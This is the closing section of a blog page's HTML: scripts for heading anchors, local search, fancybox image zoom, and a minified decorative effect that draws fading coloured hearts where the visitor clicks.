    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>





  
  
    <script>
      !function (e, t, a) {
        function r() {
          for (var e = 0; e < s.length; e++) s[e].alpha <= 0 ? (t.body.removeChild(s[e].el), s.splice(e, 1)) : (s[e].y--, s[e].scale += .004, s[e].alpha -= .013, s[e].el.style.cssText = "left:" + s[e].x + "px;top:" + s[e].y + "px;opacity:" + s[e].alpha + ";transform:scale(" + s[e].scale + "," + s[e].scale + ") rotate(45deg);background:" + s[e].color + ";z-index:99999");
          requestAnimationFrame(r)
        }

        function n() {
          var t = "function" == typeof e.onclick && e.onclick;
          e.onclick = function (e) {
            t && t(), o(e)
          }
        }

        function o(e) {
          var a = t.createElement("div");
          a.className = "heart", s.push({
            el: a,
            x: e.clientX - 5,
            y: e.clientY - 5,
            scale: 1,
            alpha: 1,
            color: c()
          }), t.body.appendChild(a)
        }

        function i(e) {
          var a = t.createElement("style");
          a.type = "text/css";
          try {
            a.appendChild(t.createTextNode(e))
          } catch (t) {
            a.styleSheet.cssText = e
          }
          t.getElementsByTagName("head")[0].appendChild(a)
        }

        function c() {
          return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
        }

        var s = [];
        e.requestAnimationFrame = e.requestAnimationFrame || e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || function (e) {
          setTimeout(e, 1e3 / 60)
        }, i(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"), n(), r()
      }(window, document);
    </script>
  








</body>
</html>
